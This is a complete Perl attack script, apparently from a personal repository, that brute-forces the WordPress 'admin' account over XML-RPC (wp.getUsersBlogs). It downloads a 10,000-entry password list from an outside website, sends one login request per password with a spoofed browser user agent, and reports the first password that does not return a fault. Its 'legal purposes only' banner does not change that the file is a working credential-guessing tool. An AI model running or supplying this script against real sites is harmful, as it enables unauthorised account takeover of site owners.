#!/usr/bin/perl
use warnings;
use HTTP::Request::Common qw{ POST };
use HTTP::Request;
use LWP::UserAgent;
use File::Fetch;
###################################################################
###############THIS PACKAGE IS SELF DOCUMENTING####################
#########AUTHOR: ArtificialBreeze			###########
####USE ON YOUR DOMAIN ONLY!#######################################
###################################################################
###		Use for legal purposes ONLY 			###
###################################################################
###       check out the repo: github.com/artificialbreeze       ###
###################################################################
my ($server);
$server = 'http://putyoursitehere';
print "##########################################\n########    W0rdpre55 P1ngBack   #########\n##########################################\n";
print "Please wait, fetching 10k password list...\n";
 my $ff = File::Fetch->new(uri => 'http://screwdesk.com/wp-content/uploads/2013/04/top-10000-passwords.txt');
 my $where = $ff->fetch() or die $ff->error;
open (DATA, "top-10000-passwords.txt") or die$!;
my @pass = <DATA>;
print scalar(@pass)." passwords found in the list\n";
foreach (@pass)
{
   chomp($_);
   my $pass=$_;
   my $content="<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>".$pass."</string></value></param></params></methodCall>";
   my $ua = LWP::UserAgent->new();
   $ua->agent('User-Agent=Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.7'); 
   my $request = POST (
       $server,
       Content_Type => 'text/xml',
       Content      => $content
       );
  #print "Preview of crafted request to be sent: \n$content \n";
   print "Sending POST requests with pair admin /".$pass."\n";
   my $return = $ua->request($request)->as_string;
   if (!($return =~ /faultCode/g))
	{
	print "Found matching pair : admin / ".$pass;
	last;
	}
}
